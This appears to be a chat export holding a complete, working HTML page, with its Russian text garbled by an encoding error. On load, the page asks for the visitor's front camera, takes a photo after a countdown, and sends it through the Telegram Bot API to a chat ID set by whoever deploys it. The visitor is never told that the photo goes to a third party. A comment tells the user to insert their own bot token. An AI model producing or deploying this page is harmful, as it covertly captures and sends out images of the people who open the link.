üòÉ, [20.10.2025 1:18]
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–ê–≤—Ç–æ-—Ñ–æ—Ç–æ</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            text-align: center; 
            padding: 20px;
            background: #f0f0f0;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        #camera { 
            width: 100%; 
            max-width: 400px; 
            border-radius: 10px;
            display: none; /* –°–Ω–∞—á–∞–ª–∞ —Å–∫—Ä—ã–≤–∞–µ–º –∫–∞–º–µ—Ä—É */
        }
        #status {
            margin: 20px 0;
            padding: 15px;
            border-radius: 8px;
            font-weight: bold;
        }
        .loading {
            background: #fff3cd;
            color: #856404;
        }
        .success {
            background: #d1edff;
            color: #0c5460;
        }
        .error {
            background: #f8d7da;
            color: #721c24;
        }
        .countdown {
            font-size: 48px;
            font-weight: bold;
            color: #007bff;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>üì∏ –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Ñ–æ—Ç–æ</h2>
        <p>–†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ - —Ñ–æ—Ç–æ —Å–¥–µ–ª–∞–µ—Ç—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏</p>
        
        <div id="countdown" class="countdown" style="display: none;">3</div>
        <video id="camera" autoplay playsinline></video>
        
        <div id="status" class="loading">
            –ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...
        </div>
    </div>

    <script>
        // >>> –ó–ê–ú–ï–ù–ò–¢–ï –≠–¢–ò –î–ê–ù–ù–´–ï –ù–ê –°–í–û–ò! <<<
        const BOT_TOKEN = '1234567890:AAHdRgLk9Q_qwertyuiopasdfghjklzxcvb';
        const YOUR_CHAT_ID = '987654321';

        const video = document.getElementById('camera');
        const statusEl = document.getElementById('status');
        const countdownEl = document.getElementById('countdown');

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ –≤ Telegram
        async function sendPhotoToTelegram(blob) {
            statusEl.textContent = "üì§ –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–æ—Ç–æ...";
            statusEl.className = 'loading';

            const formData = new FormData();
            formData.append('chat_id', YOUR_CHAT_ID);
            formData.append('photo', blob, 'auto_selfie.jpg');
            formData.append('caption', `üïí –ê–≤—Ç–æ-—Ñ–æ—Ç–æ —Å–¥–µ–ª–∞–Ω–æ: ${new Date().toLocaleString()}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    statusEl.textContent = "‚úÖ –§–æ—Ç–æ —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ! –ú–æ–∂–Ω–æ –∑–∞–∫—Ä—ã—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—É.";
                    statusEl.className = 'success';
                    
                    // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤–∏–¥–µ–æ –ø–æ—Ç–æ–∫
                    const stream = video.srcObject;
                    if (stream) {
                        stream.getTracks().forEach(track => track.stop());
                    }
                } else {
                    throw new Error(data.description || 'Unknown error');
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏:', error);
                statusEl.textContent = "‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ. –û–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É –∏ –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.";
                statusEl.className = 'error';
            }
        }

        // –§—É–Ω–∫—Ü–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –æ—Ç—Å—á–µ—Ç–∞ –∏ —Å–æ–∑–¥–∞–Ω–∏—è —Ñ–æ—Ç–æ
        function startCountdownAndCapture() {
            let count = 3;
            countdownEl.style.display = 'block';
            
            const countdownInterval = setInterval(() => {
                countdownEl.textContent = count;
                if (count === 0) {
                    clearInterval(countdownInterval);
                    countdownEl.

üòÉ, [20.10.2025 1:18]
style.display = 'none';
                    captureAndSendPhoto();
                }
                count--;
            }, 1000);
        }

        // –û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–æ—Ç–æ
        function captureAndSendPhoto() {
            statusEl.textContent = "üì∏ –î–µ–ª–∞—é —Ñ–æ—Ç–æ...";
            
            // –°–æ–∑–¥–∞–µ–º canvas –¥–ª—è –∑–∞—Ö–≤–∞—Ç–∞ –∫–∞–¥—Ä–∞
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // –†–∏—Å—É–µ–º —Ç–µ–∫—É—â–∏–π –∫–∞–¥—Ä —Å –≤–∏–¥–µ–æ (—É–∂–µ –∑–µ—Ä–∫–∞–ª—å–Ω–æ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–Ω—ã–π)
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ JPEG –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º
            canvas.toBlob(
                blob => sendPhotoToTelegram(blob), 
                'image/jpeg', 
                0.85 // –∫–∞—á–µ—Å—Ç–≤–æ 85%
            );
        }

        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∑–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', async () => {
            try {
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                });
                
                video.srcObject = stream;
                video.style.display = 'block'; // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –≤–∏–¥–µ–æ
                
                statusEl.textContent = "‚úÖ –ö–∞–º–µ—Ä–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞. –ì–æ—Ç–æ–≤–ª—é—Å—å –∫ —Å—ä–µ–º–∫–µ...";
                
                // –î–∞–µ–º –∫–∞–º–µ—Ä–µ 1 —Å–µ–∫—É–Ω–¥—É –Ω–∞ —Ñ–æ–∫—É—Å–∏—Ä–æ–≤–∫—É –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫—É –æ—Å–≤–µ—â–µ–Ω–∏—è
                setTimeout(startCountdownAndCapture, 1000);
                
            } catch (error) {
                console.error("–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ:", error);
                statusEl.textContent = "‚ùå –û—à–∏–±–∫–∞: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ. –†–∞–∑—Ä–µ—à–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∏ –æ–±–Ω–æ–≤–∏—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É.";
                statusEl.className = 'error';
            }
        });

        // –û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–∫—Ä—ã—Ç–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã - –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É
        window.addEventListener('beforeunload', () => {
            const stream = video.srcObject;
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
            }
        });
    </script>
</body>
</html>
